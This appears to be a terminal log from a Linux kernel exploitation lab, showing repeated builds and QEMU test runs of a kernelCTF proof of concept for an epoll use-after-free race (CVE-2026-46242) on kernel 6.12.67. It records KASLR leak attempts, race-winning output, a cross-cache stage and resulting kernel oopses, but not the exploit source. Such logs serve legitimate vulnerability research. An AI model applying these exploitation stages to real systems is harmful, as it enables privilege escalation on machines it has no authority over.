@@ -1,0 +1,668 @@
+/tmp # exit
+[  120.743894] Kernel panic - not syncing: Attempted to kill init! exitcode=0x00007f00
+[  120.745558] CPU: 1 UID: 0 PID: 1 Comm: sh Not tainted 6.12.67 #1
+[  120.745758] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.17.0-10.fc44 06/10/2025
+[  120.746084] Call Trace:
+[  120.746908]  <TASK>
+[  120.747221]  dump_stack_lvl+0x4d/0x70
+[  120.747722]  panic+0x10d/0x314
+[  120.747862]  do_exit.cold+0x41/0x41
+[  120.747959]  do_group_exit+0x28/0xb0
+[  120.748071]  __x64_sys_exit_group+0x13/0x20
+[  120.748208]  x64_sys_call+0x14af/0x14b0
+[  120.748321]  do_syscall_64+0x9e/0x1a0
+[  120.748411]  entry_SYSCALL_64_after_hwframe+0x77/0x7f
+[  120.748744] RIP: 0033:0x42c6ce
+[  120.749188] Code: 12 00 48 8b 05 33 bc 12 00 e9 81 fe ff ff 66 2e 0f 1f 84 00 00 00 00 00 0f 1f 40 00 f3 0f 1e fa 48 63 ff b8 e7 00 00 00 0f 05 <66> 90 b8 3c 00 00 00 0f 05 eb f7 0f 1f 80 00 00 00 00 f3 0f 1e fa
+[  120.749637] RSP: 002b:00007ffc6231f7e8 EFLAGS: 00000202 ORIG_RAX: 00000000000000e7
+[  120.749825] RAX: ffffffffffffffda RBX: 0000000000000004 RCX: 000000000042c6ce
+[  120.749971] RDX: 00007fd72ffb0030 RSI: 0000000000000000 RDI: 000000000000007f
+[  120.750117] RBP: 00007ffc6231f7f0 R08: 00007fd72ffaf96c R09: 0000000000000000
+[  120.750270] R10: 8080808080808080 R11: 0000000000000202 R12: 00007ffc62320fcd
+[  120.750395] R13: 0000000000439dc4 R14: 00007ffc6231fab8 R15: 0000000000000000
+[  120.750558]  </TASK>
+[  120.751612] Kernel Offset: 0x18a00000 from 0xffffffff81000000 (relocation range: 0xffffffff80000000-0xffffffffbfffffff)
+[  120.752095] ---[ end Kernel panic - not syncing: Attempted to kill init! exitcode=0x00007f00 ]---
+QEMU: Terminated
+legion@fedora:/mnt/work/company/cyphermatrix/repos/bad-epoll-lab/exploit/tier1-linux-vm$ 
+
+
+
+============================================
+  bad-epoll-lab — Tier 1 VM
+  Kernel: 6.12.67
+  User: uid=0 gid=0
+============================================
+
+Exploit is at /bin/exploit (if injected)
+Run: /bin/exploit
+
+/bin/sh: can't access tty; job control turned off
+~ # /bin/exploit
+X
+[env] cpu model: Common KVM processor
+[env] cpuinfo MHz: 1895.971
+terminate called after throwing an instance of 'ExpKitError'
+  what():  Target not found: Linux version 6.12.67 (legion@fedora) (gcc (GCC) 16.1.1 20260515 (Red Hat 16.1.1-2), GNU ld version 2.46-3.fc44) #1 SMP PREEMPT_DYNAMIC Mon Jul  6 23:54:53 IST 2026
+Aborted
+~ # 
+# 1. Go to the exploit build directory and recompile
+cd /mnt/work/company/cyphermatrix/repos/bad-epoll-lab/exploit/tier1-linux-vm/security-research/pocs/linux/kernelctf/CVE-2026-46242_lts_cos/exploit/lts-6.12.67
+make clean && make -j$(nproc)
+
+# 2. Go to the Tier 1 workspace directory
+cd /mnt/work/company/cyphermatrix/repos/bad-epoll-lab/exploit/tier1-linux-vm
+
+# 3. Copy the compiled exploit to /bin/exploit in the rootfs
+cp security-research/pocs/linux/kernelctf/CVE-2026-46242_lts_cos/exploit/lts-6.12.67/exploit rootfs/bin/exploit
+
+# 4. Package the rootfs into initramfs.cpio
+cd rootfs
+find . -print0 | cpio --null -ov --format=newc > ../initramfs.cpio
+cd ..
+
+# 5. Boot QEMU again
+qemu-system-x86_64 \
+  -kernel linux-6.12.67/arch/x86/boot/bzImage \
+  -initrd initramfs.cpio \
+  -append "console=ttyS0 quiet" \
+  -nographic \
+  -smp 2 \
+  -m 2G \
+  -cpu kvm64,+smep,+smap
+# 1. Go to the exploit build directory and recompile
+cd /mnt/work/company/cyphermatrix/repos/bad-epoll-lab/exploit/tier1-linux-vm/security-research/pocs/linux/kernelctf/CVE-2026-46242_lts_cos/exploit/lts-6.12.67
+make clean && make -j$(nproc)
+
+# 2. Go to the Tier 1 workspace directory
+cd /mnt/work/company/cyphermatrix/repos/bad-epoll-lab/exploit/tier1-linux-vm
+
+# 3. Copy the compiled exploit to /bin/exploit in the rootfs
+cp security-research/pocs/linux/kernelctf/CVE-2026-46242_lts_cos/exploit/lts-6.12.67/exploit rootfs/bin/exploit
+
+# 4. Package the rootfs into initramfs.cpio
+cd rootfs
+find . -print0 | cpio --null -ov --format=newc > ../initramfs.cpio
+cd ..
+
+# 5. Boot QEMU again
+qemu-system-x86_64 \
+  -kernel linux-6.12.67/arch/x86/boot/bzImage \
+  -initrd initramfs.cpio \
+  -append "console=ttyS0 quiet" \
+  -nographic \
+  -smp 2 \
+  -m 2G \
+  -cpu kvm64,+smep,+smap
+============================================
+  bad-epoll-lab — Tier 1 VM
+  Kernel: 6.12.67
+  User: uid=0 gid=0
+============================================
+
+Exploit is at /bin/exploit (if injected)
+Run: /bin/exploit
+
+/bin/sh: can't access tty; job control turned off
+~ # /bin/exploit
+X
+[env] cpu model: Common KVM processor
+[env] cpuinfo MHz: 1895.985
+[+] target: kernelctf lts-6.12.67
+[*] KASLR leak...
+Illegal instruction
+~ # 
+
+~ # QEMU: Terminated
+legion@fedora:/mnt/work/company/cyphermatrix/repos/bad-epoll-lab/exploit/tier1-linux-vm$ qemu-system-x86_64 \
+  -kernel linux-6.12.67/arch/x86/boot/bzImage \
+  -initrd initramfs.cpio \
+  -append "console=ttyS0 quiet" \
+  -nographic \
+  -smp 2 \
+  -m 2G \
+  -enable-kvm \
+  -cpu host
+
+
+============================================
+  bad-epoll-lab — Tier 1 VM
+  Kernel: 6.12.67
+  User: uid=0 gid=0
+============================================
+
+Exploit is at /bin/exploit (if injected)
+Run: /bin/exploit
+
+/bin/sh: can't access tty; job control turned off
+~ # /bin/exploit
+X
+[env] cpu model: Intel(R) Core(TM) i5-8350U CPU @ 1.70GHz
+[env] cpuinfo MHz: 1895.997
+[+] target: kernelctf lts-6.12.67
+[*] KASLR leak...
+terminate called after throwing an instance of 'ExpKitError'
+  what():  Failed to leak KASLR base
+Aborted
+~ # 
+
+
+
+============================================
+  bad-epoll-lab — Tier 1 VM
+  Kernel: 6.12.67
+  User: uid=0 gid=0
+============================================
+
+Exploit is at /bin/exploit (if injected)
+Run: /bin/exploit
+
+/bin/sh: can't access tty; job control turned off
+~ # /bin/exploit
+X
+[env] cpu model: Intel(R) Core(TM) i5-8350U CPU @ 1.70GHz
+[env] cpuinfo MHz: 1895.997
+[+] target: kernelctf lts-6.12.67
+[*] KASLR leak...
+[!] KASLR leak failed (Failed to leak KASLR base). Falling back to static base (nokaslr assumed).
+[+] kernel_base=ffffffff81000000
+[+] race setup done
+[*] racer: false-sharing window=342540 ns -> fire 171270 ns ahead
+[*] racing close-vs-close...
+[+] racer: stat done (10 iters) -> locked best range [250,4000] (interrupts=0)
+[+] racer: stat done (10 iters) -> locked best range [250,4000] (interrupts=0)
+[+] racer: stat done (10 iters) -> locked best range [250,4000] (interrupts=0)
+[+] racer: stat done (10 iters) -> locked best range [250,4000] (interrupts=0)
+[+] racer: stat done (10 iters) -> locked best range [250,4000] (interrupts=0)
+[+] racer: stat done (10 iters) -> locked best range [250,4000] (interrupts=0)
+[+] racer: stat done (10 iters) -> locked best range [250,4000] (interrupts=0)
+[+] racer: stat done (10 iters) -> locked best range [250,4000] (interrupts=0)
+[+] racer: stat done (10 iters) -> locked best range [250,4000] (interrupts=0)
+[+] racer: stat done (10 iters) -> locked best range [250,4000] (interrupts=0)
+[+] racer: stat done (10 iters) -> locked best range [250,4000] (interrupts=0)
+[+] racer: stat done (10 iters) -> locked best range [250,4000] (interrupts=0)
+[+] racer: stat done (10 iters) -> locked best range [250,4000] (interrupts=0)
+[+] racer: stat done (10 iters) -> locked best range [250,4000] (interrupts=0)
+[+] racer: stat done (10 iters) -> locked best range [250,4000] (interrupts=0)
+[+] racer: stat done (10 iters) -> locked best range [250,4000] (interrupts=0)
+[+] racer: stat done (10 iters) -> locked best range [250,4000] (interrupts=0)
+[+] racer: stat done (10 iters) -> locked best range [250,4000] (interrupts=0)
+[+] racer: stat done (10 iters) -> locked best range [250,4000] (interrupts=0)
+[+] racer: stat done (10 iters) -> locked best range [250,4000] (interrupts=0)
+[+] racer: stat done (10 iters) -> locked best range [250,4000] (interrupts=0)
+[+] racer: stat done (10 iters) -> locked best range [250,4000] (interrupts=0)
+[+] racer: stat done (10 iters) -> locked best range [250,4000] (interrupts=0)
+[+] racer: stat done (10 iters) -> locked best range [250,4000] (interrupts=0)
+[+] racer: stat done (10 iters) -> locked best range [250,4000] (interrupts=0)
+[+] racer: stat done (10 iters) -> locked best range [250,4000] (interrupts=0)
+[+] racer: stat done (10 iters) -> locked best range [250,4000] (interrupts=0)
+[+] racer: stat done (10 iters) -> locked best range [250,4000] (interrupts=0)
+[+] racer: stat done (10 iters) -> locked best range [250,4000] (interrupts=0)
+[+] racer: stat done (10 iters) -> locked best range [250,4000] (interrupts=0)
+[+] racer: stat done (10 iters) -> locked best range [250,4000] (interrupts=0)
+[+] racer: stat done (10 iters) -> locked best range [250,4000] (interrupts=0)
+[+] racer: stat done (10 iters) -> locked best range [250,4000] (interrupts=0)
+[+] racer: stat done (10 iters) -> locked best range [250,4000] (interrupts=0)
+[+] racer: stat done (10 iters) -> locked best range [250,4000] (interrupts=0)
+[+] racer: stat done (10 iters) -> locked best range [250,4000] (interrupts=0)
+[+] racer: stat done (10 iters) -> locked best range [250,4000] (interrupts=0)
+[+] racer: stat done (10 iters) -> locked best range [250,4000] (interrupts=0)
+[+] racer: stat done (10 iters) -> locked best range [250,4000] (interrupts=0)
+[+] racer: stat done (10 iters) -> locked best range [250,4000] (interrupts=0)
+[+] racer: stat done (10 iters) -> locked best range [250,4000] (interrupts=0)
+[+] racer: stat done (10 iters) -> locked best range [250,4000] (interrupts=0)
+[+] racer: stat done (10 iters) -> locked best range [250,4000] (interrupts=0)
+[+] racer: stat done (10 iters) -> locked best range [250,4000] (interrupts=0)
+[+] racer: stat done (10 iters) -> locked best range [250,4000] (interrupts=0)
+[+] racer: stat done (10 iters) -> locked best range [250,4000] (interrupts=0)
+[+] racer: stat done (10 iters) -> locked best range [250,4000] (interrupts=0)
+[+] racer: stat done (10 iters) -> locked best range [250,4000] (interrupts=0)
+[+] racer: stat done (10 iters) -> locked best range [250,4000] (interrupts=0)
+[+] racer: stat done (10 iters) -> locked best range [250,4000] (interrupts=0)
+[+] racer: stat done (10 iters) -> locked best range [250,4000] (interrupts=0)
+[+] racer: stat done (10 iters) -> locked best range [250,4000] (interrupts=0)
+[+] racer: stat done (10 iters) -> locked best range [250,4000] (interrupts=0)
+[+] racer: stat done (10 iters) -> locked best range [250,4000] (interrupts=0)
+[+] racer: stat done (10 iters) -> locked best range [250,4000] (interrupts=0)
+[+] racer: stat done (10 iters) -> locked best range [250,4000] (interrupts=0)
+[+] racer: stat done (10 iters) -> locked best range [250,4000] (interrupts=0)
+[+] racer: stat done (10 iters) -> locked best range [250,4000] (interrupts=0)
+[+] racer: stat done (10 iters) -> locked best range [250,4000] (interrupts=0)
+[+] racer: stat done (10 iters) -> locked best range [250,4000] (interrupts=0)
+[+] racer: stat done (10 iters) -> locked best range [250,4000] (interrupts=0)
+[+] racer: stat done (10 iters) -> locked best range [250,4000] (interrupts=0)
+[+] racer: stat done (10 iters) -> locked best range [250,4000] (interrupts=0)
+[+] racer: stat done (10 iters) -> locked best range [250,4000] (interrupts=0)
+[+] racer: stat done (10 iters) -> locked best range [250,4000] (interrupts=0)
+[+] racer: stat done (10 iters) -> locked best range [250,4000] (interrupts=0)
+[+] racer: stat done (10 iters) -> locked best range [250,4000] (interrupts=0)
+[+] racer: stat done (10 iters) -> locked best range [250,4000] (interrupts=0)
+[+] racer: stat done (10 iters) -> locked best range [250,4000] (interrupts=0)
+[+] racer: stat done (10 iters) -> locked best range [250,4000] (interrupts=0)
+[+] racer: stat done (10 iters) -> locked best range [250,4000] (interrupts=0)
+[+] racer: stat done (10 iters) -> locked best range [250,4000] (interrupts=0)
+[+] racer: stat done (10 iters) -> locked best range [250,4000] (interrupts=0)
+[+] racer: stat done (10 iters) -> locked best range [250,4000] (interrupts=0)
+[+] racer: stat done (10 iters) -> locked best range [250,4000] (interrupts=0)
+[+] racer: stat done (10 iters) -> locked best range [250,4000] (interrupts=0)
+[+] racer: stat done (10 iters) -> locked best range [250,4000] (interrupts=0)
+[+] racer: stat done (10 iters) -> locked best range [250,4000] (interrupts=0)
+[+] racer: stat done (10 iters) -> locked best range [250,4000] (interrupts=0)
+[+] racer: stat done (10 iters) -> locked best range [250,4000] (interrupts=0)
+[+] racer: stat done (10 iters) -> locked best range [250,4000] (interrupts=0)
+[+] racer: stat done (10 iters) -> locked best range [250,4000] (interrupts=0)
+[+] racer: stat done (10 iters) -> locked best range [250,4000] (interrupts=0)
+[+] racer: stat done (10 iters) -> locked best range [250,4000] (interrupts=0)
+[+] racer: stat done (10 iters) -> locked best range [250,4000] (interrupts=0)
+[+] racer: stat done (10 iters) -> locked best range [250,4000] (interrupts=0)
+[+] racer: stat done (10 iters) -> locked best range [250,4000] (interrupts=0)
+[+] racer: stat done (10 iters) -> locked best range [250,4000] (interrupts=0)
+[+] racer: stat done (10 iters) -> locked best range [250,4000] (interrupts=0)
+[+] racer: stat done (10 iters) -> locked best range [250,4000] (interrupts=0)
+[+] racer: stat done (10 iters) -> locked best range [250,4000] (interrupts=0)
+[+] racer: stat done (10 iters) -> locked best range [250,4000] (interrupts=0)
+[+] racer: stat done (10 iters) -> locked best range [250,4000] (interrupts=0)
+[+] racer: stat done (10 iters) -> locked best range [250,4000] (interrupts=0)
+[+] racer: stat done (10 iters) -> locked best range [250,4000] (interrupts=0)
+[+] racer: stat done (10 iters) -> locked best range [250,4000] (interrupts=0)
+[+] racer: stat done (10 iters) -> locked best range [250,4000] (interrupts=0)
+[+] racer: stat done (10 iters) -> locked best range [250,4000] (interrupts=0)
+[+] racer: stat done (10 iters) -> locked best range [250,4000] (interrupts=0)
+[+] racer: stat done (10 iters) -> locked best range [250,4000] (interrupts=0)
+[+] racer: stat done (10 iters) -> locked best range [250,4000] (interrupts=0)
+[+] racer: stat done (10 iters) -> locked best range [250,4000] (interrupts=0)
+[+] racer: stat done (10 iters) -> locked best range [250,4000] (interrupts=0)
+[+] racer: stat done (10 iters) -> locked best range [250,4000] (interrupts=0)
+[+] racer: stat done (10 iters) -> locked best range [250,4000] (interrupts=0)
+[+] racer: stat done (10 iters) -> locked best range [250,4000] (interrupts=0)
+[+] racer: stat done (10 iters) -> locked best range [250,4000] (interrupts=0)
+[+] racer: stat done (10 iters) -> locked best range [250,4000] (interrupts=0)
+[+] racer: stat done (10 iters) -> locked best range [250,4000] (interrupts=0)
+[+] racer: stat done (10 iters) -> locked best range [250,4000] (interrupts=0)
+[+] racer: stat done (10 iters) -> locked best range [250,4000] (interrupts=0)
+[+] racer: stat done (10 iters) -> locked best range [250,4000] (interrupts=0)
+[+] racer: stat done (10 iters) -> locked best range [250,4000] (interrupts=0)
+[+] racer: stat done (10 iters) -> locked best range [250,4000] (interrupts=0)
+[+] racer: stat done (10 iters) -> locked best range [250,4000] (interrupts=0)
+[+] racer: stat done (10 iters) -> locked best range [250,4000] (interrupts=0)
+[+] racer: stat done (10 iters) -> locked best range [250,4000] (interrupts=0)
+[+] racer: stat done (10 iters) -> locked best range [250,4000] (interrupts=0)
+[+] racer: stat done (10 iters) -> locked best range [250,4000] (interrupts=0)
+[+] racer: stat done (10 iters) -> locked best range [250,4000] (interrupts=0)
+[+] racer: stat done (10 iters) -> locked best range [250,4000] (interrupts=0)
+[+] racer: stat done (10 iters) -> locked best range [250,4000] (interrupts=0)
+[+] racer: stat done (10 iters) -> locked best range [250,4000] (interrupts=0)
+[+] racer: stat done (10 iters) -> locked best range [250,4000] (interrupts=0)
+[+] racer: stat done (10 iters) -> locked best range [250,4000] (interrupts=0)
+[+] racer: stat done (10 iters) -> locked best range [250,4000] (interrupts=0)
+[+] racer: stat done (10 iters) -> locked best range [250,4000] (interrupts=0)
+[+] racer: stat done (10 iters) -> locked best range [250,4000] (interrupts=0)
+[+] racer: stat done (10 iters) -> locked best range [250,4000] (interrupts=0)
+[+] racer: stat done (10 iters) -> locked best range [250,4000] (interrupts=0)
+[+] racer: stat done (10 iters) -> locked best range [250,4000] (interrupts=0)
+[+] racer: stat done (10 iters) -> locked best range [250,4000] (interrupts=0)
+[+] racer: stat done (10 iters) -> locked best range [250,4000] (interrupts=0)
+[+] racer: stat done (10 iters) -> locked best range [250,4000] (interrupts=0)
+[+] racer: stat done (10 iters) -> locked best range [250,4000] (interrupts=0)
+[+] racer: stat done (10 iters) -> locked best range [250,4000] (interrupts=0)
+[+] racer: stat done (10 iters) -> locked best range [250,4000] (interrupts=0)
+[+] racer: stat done (10 iters) -> locked best range [250,4000] (interrupts=0)
+[+] racer: stat done (10 iters) -> locked best range [250,4000] (interrupts=0)
+[+] racer: stat done (10 iters) -> locked best range [250,4000] (interrupts=0)
+[+] racer: stat done (10 iters) -> locked best range [250,4000] (interrupts=0)
+[+] racer: stat done (10 iters) -> locked best range [250,4000] (interrupts=0)
+[+] racer: stat done (10 iters) -> locked best range [250,4000] (interrupts=0)
+[+] racer: stat done (10 iters) -> locked best range [250,4000] (interrupts=0)
+[+] racer: stat done (10 iters) -> locked best range [250,4000] (interrupts=0)
+[+] racer: stat done (10 iters) -> locked best range [250,4000] (interrupts=0)
+[+] racer: stat done (10 iters) -> locked best range [250,4000] (interrupts=0)
+[+] racer: stat done (10 iters) -> locked best range [250,4000] (interrupts=0)
+[+] racer: stat done (10 iters) -> locked best range [250,4000] (interrupts=0)
+[+] racer: stat done (10 iters) -> locked best range [250,4000] (interrupts=0)
+[+] racer: stat done (10 iters) -> locked best range [250,4000] (interrupts=0)
+[+] racer: stat done (10 iters) -> locked best range [250,4000] (interrupts=0)
+[+] racer: stat done (10 iters) -> locked best range [250,4000] (interrupts=0)
+[+] racer: stat done (10 iters) -> locked best range [250,4000] (interrupts=0)
+[+] racer: stat done (10 iters) -> locked best range [250,4000] (interrupts=0)
+[+] racer: stat done (10 iters) -> locked best range [250,4000] (interrupts=0)
+[+] racer: stat done (10 iters) -> locked best range [250,4000] (interrupts=0)
+[+] racer: stat done (10 iters) -> locked best range [250,4000] (interrupts=0)
+[+] racer: stat done (10 iters) -> locked best range [250,4000] (interrupts=0)
+[+] racer: stat done (10 iters) -> locked best range [250,4000] (interrupts=0)
+[+] racer: stat done (10 iters) -> locked best range [250,4000] (interrupts=0)
+[+] racer: stat done (10 iters) -> locked best range [250,4000] (interrupts=0)
+[+] racer: stat done (10 iters) -> locked best range [250,4000] (interrupts=0)
+[+] racer: stat done (10 iters) -> locked best range [250,4000] (interrupts=0)
+[+] racer: stat done (10 iters) -> locked best range [250,4000] (interrupts=0)
+[+] racer: stat done (10 iters) -> locked best range [250,4000] (interrupts=0)
+[+] racer: stat done (10 iters) -> locked best range [250,4000] (interrupts=0)
+[+] racer: stat done (10 iters) -> locked best range [250,4000] (interrupts=0)
+[+] racer: stat done (10 iters) -> locked best range [250,4000] (interrupts=0)
+^C[+] racer: stat done (10 iters) -> locked best range [250,4000] (interrupts=0)
+[+] race won: retries=534457 launch=2949 cc_retries=1
+[*] cross-cache...
+[  278.032282] BUG: unable to handle page fault for address: ffffffff8440d830
+[  278.032765] #PF: supervisor read access in kernel mode
+[  278.033117] #PF: error_code(0x0000) - not-present page
+[  278.033435] PGD 2c31067 P4D 2c31067 PUD 2c32063 PMD 0 
+[  278.033786] Oops: Oops: 0000 [#1] PREEMPT SMP PTI
+[  278.034088] CPU: 1 UID: 0 PID: 67 Comm: exploit Not tainted 6.12.67 #1
+[  278.034454] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.17.0-10.fc44 06/10/2025
+[  278.035066] RIP: 0010:ep_show_fdinfo+0x4c/0x80
+[  278.035332] Code: 4c 48 89 df e8 f5 f3 cf 00 48 89 c3 48 85 c0 74 3c 48 8b 53 30 4c 8b 43 6c 48 89 ef 8b 4b 68 48 8b 42 28 4c 8b 4a 70 8b 53 38 <48> 8b 70 28 8b 76 10 56 48 c7 c6 18 a7 99 82 ff 70 40 e8 7d 27 fd
+[  278.036448] RSP: 0018:ffffc9000024bd30 EFLAGS: 00010286
+[  278.036844] RAX: ffffffff8440d808 RBX: ffff888005cfb400 RCX: 0000000000000019
+[  278.037261] RDX: 0000000000000107 RSI: ffff888005bcd900 RDI: ffff888006492000
+[  278.037752] RBP: ffff888006492000 R08: 0000000000000000 R09: 0000000000000000
+[  278.038149] R10: ffff888006492000 R11: 0000000000000000 R12: ffff888005bce240
+[  278.038583] R13: 0000000000000000 R14: 0000000000000002 R15: ffff888005bcd900
+[  278.038984] FS:  0000000004a2f400(0000) GS:ffff88807cb00000(0000) knlGS:0000000000000000
+[  278.039444] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
+[  278.039812] CR2: ffffffff8440d830 CR3: 0000000003f50004 CR4: 0000000000370ef0
+[  278.040208] Call Trace:
+[  278.040371]  <TASK>
+[  278.040501]  seq_show+0x14c/0x240
+[  278.040746]  seq_read_iter+0x111/0x460
+[  278.040977]  seq_read+0x128/0x1c0
+[  278.041170]  vfs_read+0x114/0x490
+[  278.041364]  ? vfs_write+0x43e/0x570
+[  278.041611]  __x64_sys_pread64+0x92/0xd0
+[  278.041837]  do_syscall_64+0x9e/0x1a0
+[  278.042050]  entry_SYSCALL_64_after_hwframe+0x77/0x7f
+[  278.042342] RIP: 0033:0x557912
+[  278.042570] Code: 08 0f 85 f1 a7 ff ff 49 89 fb 48 89 f0 48 89 d7 48 89 ce 4c 89 c2 4d 89 ca 4c 8b 44 24 08 4c 8b 4c 24 10 4c 89 5c 24 08 0f 05 <c3> 66 2e 0f 1f 84 00 00 00 00 00 0f 1f 00 f3 0f 1e fa 55 bf 01 00
+[  278.043634] RSP: 002b:00007ffc90e5b858 EFLAGS: 00000246 ORIG_RAX: 0000000000000011
+[  278.044050] RAX: ffffffffffffffda RBX: 0000000000000000 RCX: 0000000000557912
+[  278.044446] RDX: 0000000000000400 RSI: 00007ffc90e5b8d0 RDI: 000000000000000b
+[  278.044883] RBP: 00007ffc90e5b880 R08: 0000000000000000 R09: 0000000000000000
+[  278.045280] R10: 0000000000000000 R11: 0000000000000246 R12: 0000000004a45448
+[  278.045709] R13: 0000000004a45448 R14: 0000000004a45450 R15: 0000000004a453f0
+[  278.046130]  </TASK>
+[  278.046265] Modules linked in:
+[  278.046446] CR2: ffffffff8440d830
+[  278.046685] ---[ end trace 0000000000000000 ]---
+[  278.046953] RIP: 0010:ep_show_fdinfo+0x4c/0x80
+[  278.047225] Code: 4c 48 89 df e8 f5 f3 cf 00 48 89 c3 48 85 c0 74 3c 48 8b 53 30 4c 8b 43 6c 48 89 ef 8b 4b 68 48 8b 42 28 4c 8b 4a 70 8b 53 38 <48> 8b 70 28 8b 76 10 56 48 c7 c6 18 a7 99 82 ff 70 40 e8 7d 27 fd
+[  278.048332] RSP: 0018:ffffc9000024bd30 EFLAGS: 00010286
+[  278.048676] RAX: ffffffff8440d808 RBX: ffff888005cfb400 RCX: 0000000000000019
+[  278.049094] RDX: 0000000000000107 RSI: ffff888005bcd900 RDI: ffff888006492000
+[  278.049573] RBP: ffff888006492000 R08: 0000000000000000 R09: 0000000000000000
+[  278.050020] R10: ffff888006492000 R11: 0000000000000000 R12: ffff888005bce240
+[  278.050448] R13: 0000000000000000 R14: 0000000000000002 R15: ffff888005bcd900
+[  278.050926] FS:  0000000004a2f400(0000) GS:ffff88807cb00000(0000) knlGS:0000000000000000
+[  278.051427] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
+[  278.051802] CR2: ffffffff8440d830 CR3: 0000000003f50004 CR4: 0000000000370ef0
+[  278.052224] note: exploit[67] exited with irqs disabled
+[  278.052608] exploit (67) used greatest stack depth: 13192 bytes left
+^C^C^C^CQEMU: Terminated
+legion@fedora:/mnt/work/company/cyphermatrix/repos/bad-epoll-lab/exploit/tier1-linux-vm$ 
+
+
+
+
+
+# 1. Rebuild the exploit
+cd /mnt/work/company/cyphermatrix/repos/bad-epoll-lab/exploit/tier1-linux-vm/security-research/pocs/linux/kernelctf/CVE-2026-46242_lts_cos/exploit/lts-6.12.67
+make clean && make -j$(nproc)
+
+# 2. Go to the Tier 1 workspace directory
+cd /mnt/work/company/cyphermatrix/repos/bad-epoll-lab/exploit/tier1-linux-vm
+
+# 3. Copy the compiled exploit to /bin/exploit in the rootfs
+cp security-research/pocs/linux/kernelctf/CVE-2026-46242_lts_cos/exploit/lts-6.12.67/exploit rootfs/bin/exploit
+
+# 4. Package the rootfs into initramfs.cpio
+cd rootfs
+find . -print0 | cpio --null -ov --format=newc > ../initramfs.cpio
+cd ..
+
+# 5. Boot QEMU again
+qemu-system-x86_64 \
+  -kernel linux-6.12.67/arch/x86/boot/bzImage \
+  -initrd initramfs.cpio \
+  -append "console=ttyS0 quiet nokaslr" \
+  -nographic \
+  -smp 2 \
+  -m 2G \
+  -enable-kvm \
+  -cpu host
+/bin/exploit
+
+
+============================================
+  bad-epoll-lab — Tier 1 VM
+  Kernel: 6.12.67
+  User: uid=0 gid=0
+============================================
+
+Exploit is at /bin/exploit (if injected)
+Run: /bin/exploit
+
+/bin/sh: can't access tty; job control turned off
+~ # /bin/exploit
+X
+[env] cpu model: Intel(R) Core(TM) i5-8350U CPU @ 1.70GHz
+[env] cpuinfo MHz: 1895.997
+[+] target: kernelctf lts-6.12.67
+[*] KASLR leak...
+[+] kernel_base=ffffffff81000000
+[*] Calibrated close() average: 1265 cycles, threshold set to: 150000 cycles
+[+] race setup done
+[*] racing close-vs-close...
+[*] racer: false-sharing window=345265 ns -> fire 172632 ns ahead
+[+] racer: stat done (10 iters) -> locked best range [2500,3250] (interrupts=6)
+[+] racer: stat done (10 iters) -> locked best range [1500,2250] (interrupts=5)
+[+] racer: stat done (10 iters) -> locked best range [1500,2250] (interrupts=10)
+[+] racer: stat done (10 iters) -> locked best range [1500,2250] (interrupts=10)
+[+] racer: stat done (10 iters) -> locked best range [2500,3250] (interrupts=8)
+[+] racer: stat done (10 iters) -> locked best range [2750,3500] (interrupts=6)
+[+] racer: stat done (10 iters) -> locked best range [2500,3250] (interrupts=11)
+[+] racer: stat done (10 iters) -> locked best range [1500,2250] (interrupts=8)
+[+] racer: stat done (10 iters) -> locked best range [1500,2250] (interrupts=11)
+[+] racer: stat done (10 iters) -> locked best range [1500,2250] (interrupts=15)
+[+] racer: stat done (10 iters) -> locked best range [1750,2500] (interrupts=13)
+[+] racer: stat done (10 iters) -> locked best range [1750,2500] (interrupts=12)
+[+] racer: stat done (10 iters) -> locked best range [2000,2750] (interrupts=12)
+[+] racer: stat done (10 iters) -> locked best range [1500,2250] (interrupts=30)
+[+] racer: stat done (10 iters) -> locked best range [1750,2500] (interrupts=15)
+[+] racer: stat done (10 iters) -> locked best range [2750,3500] (interrupts=14)
+[+] racer: stat done (10 iters) -> locked best range [2500,3250] (interrupts=11)
+[+] racer: stat done (10 iters) -> locked best range [2750,3500] (interrupts=11)
+[+] racer: stat done (10 iters) -> locked best range [1750,2500] (interrupts=10)
+[+] racer: stat done (10 iters) -> locked best range [1500,2250] (interrupts=10)
+[+] racer: stat done (10 iters) -> locked best range [1500,2250] (interrupts=17)
+[+] racer: stat done (10 iters) -> locked best range [2500,3250] (interrupts=17)
+[+] racer: stat done (10 iters) -> locked best range [1500,2250] (interrupts=12)
+[+] racer: stat done (10 iters) -> locked best range [1500,2250] (interrupts=20)
+[+] racer: stat done (10 iters) -> locked best range [2250,3000] (interrupts=13)
+[+] racer: stat done (10 iters) -> locked best range [2000,2750] (interrupts=11)
+[+] racer: stat done (10 iters) -> locked best range [2500,3250] (interrupts=20)
+[+] racer: stat done (10 iters) -> locked best range [1500,2250] (interrupts=14)
+[+] racer: stat done (10 iters) -> locked best range [2250,3000] (interrupts=13)
+[+] racer: stat done (10 iters) -> locked best range [2500,3250] (interrupts=15)
+[+] racer: stat done (10 iters) -> locked best range [1500,2250] (interrupts=12)
+[+] racer: stat done (10 iters) -> locked best range [2000,2750] (interrupts=15)
+[+] racer: stat done (10 iters) -> locked best range [1750,2500] (interrupts=12)
+[+] racer: stat done (10 iters) -> locked best range [1750,2500] (interrupts=38)
+[+] racer: stat done (10 iters) -> locked best range [2250,3000] (interrupts=40)
+[+] racer: stat done (10 iters) -> locked best range [1750,2500] (interrupts=40)
+[+] racer: stat done (10 iters) -> locked best range [2250,3000] (interrupts=40)
+[+] racer: stat done (10 iters) -> locked best range [1750,2500] (interrupts=40)
+[+] racer: stat done (10 iters) -> locked best range [2000,2750] (interrupts=40)
+[+] racer: stat done (10 iters) -> locked best range [1750,2500] (interrupts=40)
+[+] racer: stat done (10 iters) -> locked best range [2250,3000] (interrupts=40)
+[+] racer: stat done (10 iters) -> locked best range [1750,2500] (interrupts=40)
+[+] racer: stat done (10 iters) -> locked best range [1750,2500] (interrupts=40)
+[+] racer: stat done (10 iters) -> locked best range [1750,2500] (interrupts=40)
+[+] racer: stat done (10 iters) -> locked best range [2250,3000] (interrupts=40)
+[+] racer: stat done (10 iters) -> locked best range [2000,2750] (interrupts=38)
+[+] racer: stat done (10 iters) -> locked best range [1750,2500] (interrupts=38)
+[+] racer: stat done (10 iters) -> locked best range [2000,2750] (interrupts=40)
+[+] racer: stat done (10 iters) -> locked best range [2000,2750] (interrupts=40)
+[+] racer: stat done (10 iters) -> locked best range [2000,2750] (interrupts=39)
